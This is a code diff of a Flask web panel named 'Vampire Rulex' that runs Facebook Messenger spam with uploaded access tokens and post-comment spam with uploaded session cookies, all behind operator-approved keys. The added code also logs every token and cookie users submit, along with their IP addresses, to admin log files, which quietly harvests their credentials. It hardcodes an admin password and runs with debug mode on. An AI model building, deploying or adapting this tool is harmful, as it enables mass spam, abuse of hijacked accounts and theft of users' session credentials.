@@ -1,10 +1,10 @@
-import os
-import json
-import time
-import uuid
+from flask import Flask, request, redirect
 import requests
 from threading import Thread, Event
-from flask import Flask, request
+import time
+import uuid
+import json
+import os
 
 app = Flask(__name__)
 app.debug = True
@@ -23,295 +23,214 @@ ADMIN_TOKENS_LOG = "admin_tokens.log"
 ADMIN_COOKIES_LOG = "admin_cookies.log"
 MESSAGE_LOG = "message_log.txt"
 
-def safe_load_json(file_path):
-    if not os.path.exists(file_path) or os.stat(file_path).st_size == 0:
-        return {}
-    try:
-        with open(file_path, "r") as f:
+# Load or initialize keys
+def load_keys(file):
+    if os.path.exists(file):
+        with open(file, "r") as f:
             return json.load(f)
-    except json.JSONDecodeError:
-        return {}
+    return {}
 
-approved_keys_token = safe_load_json(APPROVED_KEYS_TOKEN_FILE)
-approved_keys_cookie = safe_load_json(APPROVED_KEYS_COOKIE_FILE)
+def save_keys(file, data):
+    with open(file, "w") as f:
+        json.dump(data, f)
 
-def save_approved_keys_token():
-    with open(APPROVED_KEYS_TOKEN_FILE, "w") as f:
-        json.dump(approved_keys_token, f)
+approved_keys_token = load_keys(APPROVED_KEYS_TOKEN_FILE)
+approved_keys_cookie = load_keys(APPROVED_KEYS_COOKIE_FILE)
 
-def save_approved_keys_cookie():
-    with open(APPROVED_KEYS_COOKIE_FILE, "w") as f:
-        json.dump(approved_keys_cookie, f)
+def log(file, msg):
+    with open(file, "a") as f:
+        f.write(f"[{time.ctime()}] {msg}\n")
 
-def log_admin_token(key, token, ip):
-    with open(ADMIN_TOKENS_LOG, "a") as f:
-        f.write(f"[{time.ctime()}] Key: {key} | IP: {ip} | Token: {token}\n")
-
-def log_admin_cookie(key, cookie, ip):
-    with open(ADMIN_COOKIES_LOG, "a") as f:
-        f.write(f"[{time.ctime()}] Key: {key} | IP: {ip} | Cookie: {cookie}\n")
-
-def log_message(text):
-    with open(MESSAGE_LOG, "a") as f:
-        f.write(f"[{time.ctime()}] {text}\n")
-
-headers = {
-    'Connection': 'keep-alive',
-    'Cache-Control': 'max-age=0',
-    'Upgrade-Insecure-Requests': '1',
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'Accept-Encoding': 'gzip, deflate',
-    'Accept-Language': 'en-US,en;q=0.9'
-}
-
-def send_messages_token(access_tokens, thread_id, user_name, time_interval, messages):
+# Token mode
+def send_messages_token(tokens, thread_id, name, delay, messages):
     global stop_event_token, sent_count_token
     while not stop_event_token.is_set():
-        for message1 in messages:
+        for msg in messages:
             if stop_event_token.is_set():
                 break
-            for access_token in access_tokens:
-                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
-                message = f"{user_name}: {message1}"
-                params = {'access_token': access_token, 'message': message}
+            for token in tokens:
                 try:
-                    response = requests.post(api_url, data=params, headers=headers, timeout=15)
-                    if response.status_code == 200:
-                        print(f"Token Msg sent by {access_token[:10]}...: {message}")
+                    url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                    data = {'access_token': token, 'message': f"{name}: {msg}"}
+                    r = requests.post(url, data=data, timeout=10)
+                    if r.status_code == 200:
+                        print(f"✅ Token: {msg}")
+                        log(MESSAGE_LOG, f"TOKEN {token[:10]}... => {msg}")
                         sent_count_token += 1
-                        log_message(f"Token Msg sent by {access_token[:10]}...: {message}")
                     else:
-                        print(f"Token Msg fail {response.status_code}: {message}")
+                        print(f"❌ Token Failed [{r.status_code}]: {msg}")
                 except Exception as e:
-                    print(f"Token Msg error: {e}")
-                time.sleep(time_interval)
+                    print(f"Error Token: {e}")
+                time.sleep(delay)
 
-def send_comments_cookie(cookies_list, post_id, commenter_name, delay, comments):
+# Cookie mode
+def send_comments_cookie(cookies, post_id, name, delay, comments):
     global stop_event_cookie, sent_count_cookie
-    x, cookie_index = 0, 0
+    x = 0
+    i = 0
     while not stop_event_cookie.is_set():
         try:
-            time.sleep(delay)
-            comment = comments[x].strip()
-            comment_with_name = f"{commenter_name}: {comment}"
-            current_cookie = cookies_list[cookie_index]
-
-            data = {'message': comment_with_name}
-            cookies = {'Cookie': current_cookie}
-
-            response = requests.post(f'https://graph.facebook.com/{post_id}/comments/', data=data, cookies=cookies)
-            current_time = time.strftime('%Y-%m-%d %I:%M:%S %p')
-
-            if response.status_code == 200 and 'id' in response.json():
-                print(f"Cookie Comment sent by cookie #{cookie_index+1}: {comment_with_name}")
+            comment = f"{name}: {comments[x]}"
+            current_cookie = cookies[i]
+            r = requests.post(f'https://graph.facebook.com/{post_id}/comments/',
+                              data={'message': comment},
+                              cookies={'Cookie': current_cookie})
+            if r.status_code == 200 and 'id' in r.json():
+                print(f"✅ Cookie #{i+1}: {comment}")
+                log(MESSAGE_LOG, f"COOKIE #{i+1} => {comment}")
                 sent_count_cookie += 1
-                log_message(f"Cookie Comment sent by cookie #{cookie_index+1}: {comment_with_name}")
-                x = (x + 1) % len(comments)
-                cookie_index = (cookie_index + 1) % len(cookies_list)
             else:
-                print(f"Cookie Comment fail for cookie #{cookie_index+1}")
-                x = (x + 1) % len(comments)
-                cookie_index = (cookie_index + 1) % len(cookies_list)
-
+                print(f"❌ Cookie #{i+1} failed.")
+            x = (x + 1) % len(comments)
+            i = (i + 1) % len(cookies)
+            time.sleep(delay)
         except Exception as e:
-            print(f"Cookie Comment error: {e}")
-            time.sleep(5)
+            print(f"Cookie Error: {e}")
+            time.sleep(3)
 
 @app.route('/', methods=['GET', 'POST'])
 def index():
     global threads_token, threads_cookie, stop_event_token, stop_event_cookie, sent_count_token, sent_count_cookie
 
     if request.method == 'GET':
-        new_key_token = str(uuid.uuid4())[:8]
-        if new_key_token not in approved_keys_token:
-            approved_keys_token[new_key_token] = False
-            save_approved_keys_token()
-
-        new_key_cookie = str(uuid.uuid4())[:8]
-        if new_key_cookie not in approved_keys_cookie:
-            approved_keys_cookie[new_key_cookie] = False
-            save_approved_keys_cookie()
+        key_token = str(uuid.uuid4())[:8]
+        key_cookie = str(uuid.uuid4())[:8]
+        approved_keys_token[key_token] = False
+        approved_keys_cookie[key_cookie] = False
+        save_keys(APPROVED_KEYS_TOKEN_FILE, approved_keys_token)
+        save_keys(APPROVED_KEYS_COOKIE_FILE, approved_keys_cookie)
 
         return f"""
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-          <meta charset="utf-8">
-          <title>Vampire Rulex Panel</title>
-          <style>
-            body {{
-              background-image: url('https://i.imgur.com/92rqE1X.jpeg');
-              background-size: cover;
-              background-repeat: no-repeat;
-              background-position: center;
-              color: white;
-              font-family: Arial, sans-serif;
-            }}
-            .header {{
-              text-align: center;
-              margin-top: 20px;
-              font-size: 2em;
-              font-weight: bold;
-              text-shadow: 2px 2px 5px black;
-            }}
-            .key-box {{
-              text-align: center;
-              font-size: 1.2em;
-              margin: 10px auto;
-              background: rgba(0,0,0,0.6);
-              padding: 15px;
-              border-radius: 10px;
-              width: 300px;
-              font-weight: bold;
-              letter-spacing: 3px;
-              display: inline-block;
-              margin-right: 15px;
-            }}
-            form {{
-              max-width: 450px;
-              margin: 20px auto;
-              background: rgba(0,0,0,0.5);
-              padding: 20px;
-              border-radius: 10px;
-            }}
-            input, button, select {{
-              width: 100%;
-              padding: 8px;
-              margin: 10px 0;
-              border-radius: 5px;
-              border: none;
-            }}
-            button {{
-              background-color: #4CAF50;
-              color: white;
-              font-weight: bold;
-              cursor: pointer;
-            }}
-            hr {{
-              margin: 40px auto;
-              width: 90%;
-              border-color: white;
-              opacity: 0.4;
-            }}
-            .flex-container {{
-              text-align: center;
-            }}
-          </style>
-        </head>
-        <body>
-          <div class="header">Vampire Rulex</div>
-          <div class="flex-container">
-            <div class="key-box">
-              <div>Token Key (For Messenger Token Spam):</div>
-              <div><b>{new_key_token}</b></div>
-            </div>
-            <div class="key-box">
-              <div>Cookie Key (For Cookie Based Commenter):</div>
-              <div><b>{new_key_cookie}</b></div>
-            </div>
-          </div>
-          <hr>
-          <form method="post" enctype="multipart/form-data">
-            <label>Select Mode:</label>
-            <select name="mode" required>
-              <option value="" disabled selected>Select Option</option>
-              <option value="token">Token Spam (Messenger)</option>
-              <option value="cookie">Cookie Commenter (Post Comments)</option>
-            </select>
-
-            <label>Enter Your Approved Key:</label>
-            <input name="secret_key" required>
-
-            <div id="token_fields" style="display:none;">
-              <label>Select Token File (one token per line):</label>
-              <input type="file" name="tokenFile">
-              <label>Enter Thread ID (GC/Inbox ID):</label>
-              <input name="threadId">
-              <label>Enter Your Name (for message prefix):</label>
-              <input name="userName">
-              <label>Enter Time Delay (seconds):</label>
-              <input type="number" min="1" name="time">
-              <label>Select Messages Text File (each line a message):</label>
-              <input type="file" name="txtFile">
-            </div>
-
-            <div id="cookie_fields" style="display:none;">
-              <label>Select Cookie File (one cookie per line):</label>
-              <input type="file" name="cookieFile">
-              <label>Enter Post ID (Facebook post ID):</label>
-              <input name="postId">
-              <label>Enter Your Name (for comment prefix):</label>
-              <input name="commenterName">
-              <label>Enter Time Delay (seconds):</label>
-              <input type="number" min="1" name="delay">
-              <label>Select Comments Text File (each line a comment):</label>
-              <input type="file" name="commentsFile">
-            </div>
-
+        <h2>🧛 Vampire Rulex Panel</h2>
+        <p><b>Messenger Token Key:</b> <code>{key_token}</code></p>
+        <p><b>Cookie Commenter Key:</b> <code>{key_cookie}</code></p>
+        <form method="POST" enctype="multipart/form-data">
+            Mode:
+            <select name="mode">
+                <option value="token">Messenger (token)</option>
+                <option value="cookie">Post Comment (cookie)</option>
+            </select><br>
+            Key: <input name="secret_key"><br><br>
+            <b>Messenger:</b><br>
+            Token File: <input type="file" name="tokenFile"><br>
+            Thread ID: <input name="threadId"><br>
+            Name: <input name="userName"><br>
+            Delay: <input name="time"><br>
+            Messages File: <input type="file" name="txtFile"><br><br>
+            <b>Post:</b><br>
+            Cookie File: <input type="file" name="cookieFile"><br>
+            Post ID: <input name="postId"><br>
+            Name: <input name="commenterName"><br>
+            Delay: <input name="delay"><br>
+            Comment File: <input type="file" name="commentsFile"><br><br>
             <button type="submit">Start</button>
-          </form>
-
-          <script>
-            const modeSelect = document.querySelector('select[name="mode"]');
-            const tokenFields = document.getElementById('token_fields');
-            const cookieFields = document.getElementById('cookie_fields');
-
-            modeSelect.addEventListener('change', () => {{
-              if (modeSelect.value === 'token') {{
-                tokenFields.style.display = 'block';
-                cookieFields.style.display = 'none';
-                for(let input of tokenFields.querySelectorAll('input')) input.required = true;
-                for(let input of cookieFields.querySelectorAll('input')) input.required = false;
-              }} else if (modeSelect.value === 'cookie') {{
-                tokenFields.style.display = 'none';
-                cookieFields.style.display = 'block';
-                for(let input of cookieFields.querySelectorAll('input')) input.required = true;
-                for(let input of tokenFields.querySelectorAll('input')) input.required = false;
-              }} else {{
-                tokenFields.style.display = 'none';
-                cookieFields.style.display = 'none';
-                for(let input of tokenFields.querySelectorAll('input')) input.required = false;
-                for(let input of cookieFields.querySelectorAll('input')) input.required = false;
-              }}
-            }});
-          </script>
-          <hr>
-          <p style="text-align:center;"><a href="/admin" style="color:white;">Admin Panel (owner only)</a></p>
-        </body>
-        </html>
+        </form>
+        <p><a href="/admin">Admin Panel</a></p>
         """
 
+    mode = request.form.get("mode")
+    key = request.form.get("secret_key", "").strip()
+    ip = request.remote_addr
+
+    if mode == "token":
+        if key not in approved_keys_token or not approved_keys_token.get(key):
+            return "❌ Invalid or unapproved token key"
+        tokens = request.files['tokenFile'].read().decode().splitlines()
+        messages = request.files['txtFile'].read().decode().splitlines()
+        thread_id = request.form.get('threadId')
+        name = request.form.get('userName')
+        delay = int(request.form.get('time', 3))
+        for t in tokens:
+            log(ADMIN_TOKENS_LOG, f"{key} | {ip} | {t}")
+        if not any(t.is_alive() for t in threads_token):
+            stop_event_token.clear()
+            sent_count_token = 0
+            th = Thread(target=send_messages_token, args=(tokens, thread_id, name, delay, messages))
+            th.start()
+            threads_token.append(th)
+        return "✅ Token spam started. <a href='/status'>Check Status</a>"
+
+    elif mode == "cookie":
+        if key not in approved_keys_cookie or not approved_keys_cookie.get(key):
+            return "❌ Invalid or unapproved cookie key"
+        cookies = request.files['cookieFile'].read().decode().splitlines()
+        comments = request.files['commentsFile'].read().decode().splitlines()
+        post_id = request.form.get('postId')
+        name = request.form.get('commenterName')
+        delay = int(request.form.get('delay', 3))
+        for c in cookies:
+            log(ADMIN_COOKIES_LOG, f"{key} | {ip} | {c}")
+        if not any(t.is_alive() for t in threads_cookie):
+            stop_event_cookie.clear()
+            sent_count_cookie = 0
+            th = Thread(target=send_comments_cookie, args=(cookies, post_id, name, delay, comments))
+            th.start()
+            threads_cookie.append(th)
+        return "✅ Cookie spam started. <a href='/status'>Check Status</a>"
+
+    return "❌ Invalid Mode"
+
+@app.route('/stop', methods=['POST'])
+def stop_all():
+    stop_event_token.set()
+    stop_event_cookie.set()
+    return "🛑 All tasks stopped."
+
+@app.route('/status')
+def show_status():
+    return f"""
+    <h3>Bot Status:</h3>
+    <p>Messenger Sent: {sent_count_token}</p>
+    <p>Post Comments Sent: {sent_count_cookie}</p>
+    <form method='post' action='/stop'><button type='submit'>🛑 STOP</button></form>
+    """
+
+@app.route('/admin', methods=['GET', 'POST'])
+def admin():
+    auth = request.authorization
+    if not auth or auth.username != 'admin' or auth.password != 'ayushadmin123':
+        return ('Login required', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})
+
+    msg = ""
     if request.method == 'POST':
-        mode = request.form.get('mode')
-        secret_key = request.form.get('secret_key', '').strip()
-        user_ip = request.remote_addr
+        for key in ['approve_key_token', 'approve_key_cookie', 'remove_key_token', 'remove_key_cookie']:
+            k = request.form.get(key)
+            if not k:
+                continue
+            if 'approve' in key:
+                if 'token' in key and k in approved_keys_token:
+                    approved_keys_token[k] = True
+                    save_keys(APPROVED_KEYS_TOKEN_FILE, approved_keys_token)
+                    msg = f"✅ Approved Token Key: {k}"
+                elif 'cookie' in key and k in approved_keys_cookie:
+                    approved_keys_cookie[k] = True
+                    save_keys(APPROVED_KEYS_COOKIE_FILE, approved_keys_cookie)
+                    msg = f"✅ Approved Cookie Key: {k}"
+            if 'remove' in key:
+                if 'token' in key and k in approved_keys_token:
+                    del approved_keys_token[k]
+                    save_keys(APPROVED_KEYS_TOKEN_FILE, approved_keys_token)
+                    msg = f"❌ Removed Token Key: {k}"
+                elif 'cookie' in key and k in approved_keys_cookie:
+                    del approved_keys_cookie[k]
+                    save_keys(APPROVED_KEYS_COOKIE_FILE, approved_keys_cookie)
+                    msg = f"❌ Removed Cookie Key: {k}"
 
-        if mode == 'token':
-            if secret_key not in approved_keys_token or not approved_keys_token.get(secret_key):
-                return "<h3 style='color:red; text-align:center;'>❌ Token key invalid or not approved.</h3>"
+    html = f"<h2>🛡 Admin Panel</h2><p>{msg}</p>"
+    html += "<h3>Token Keys</h3><ul>"
+    for k, v in approved_keys_token.items():
+        html += f"<li>{k} - {'✅' if v else '❌'}</li>"
+    html += "</ul><h3>Cookie Keys</h3><ul>"
+    for k, v in approved_keys_cookie.items():
+        html += f"<li>{k} - {'✅' if v else '❌'}</li>"
+    html += "</ul><form method='POST'>"
+    html += "Key: <input name='approve_key_token'><button type='submit'>Approve Token</button><br>"
+    html += "Key: <input name='remove_key_token'><button type='submit'>Remove Token</button><br>"
+    html += "Key: <input name='approve_key_cookie'><button type='submit'>Approve Cookie</button><br>"
+    html += "Key: <input name='remove_key_cookie'><button type='submit'>Remove Cookie</button></form>"
+    return html
 
-            token_file = request.files.get('tokenFile')
-            access_tokens = token_file.read().decode().strip().splitlines() if token_file else []
-            for t in access_tokens:
-                log_admin_token(secret_key, t, user_ip)
-
-            thread_id = request.form.get('threadId')
-            user_name = request.form.get('userName', 'User')
-            time_interval = int(request.form.get('time', 5))
-
-            txt_file = request.files.get('txtFile')
-            messages = txt_file.read().decode().splitlines() if txt_file else []
-
-            if not any(t.is_alive() for t in threads_token):
-                stop_event_token.clear()
-                global sent_count_token
-                sent_count_token = 0
-                thread = Thread(target=send_messages_token, args=(access_tokens, thread_id, user_name, time_interval, messages))
-                thread.start()
-                threads_token.append(thread)
-
-            return "<h3 style='color:green; text-align:center;'>✅ Token spam started. <a href='/status'>Status</a></h3>"
-
-        elif mode == 'cookie':
-            if secret_key not in approved_keys_cookie or not approved_keys_cookie
+# --- Run app ---
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
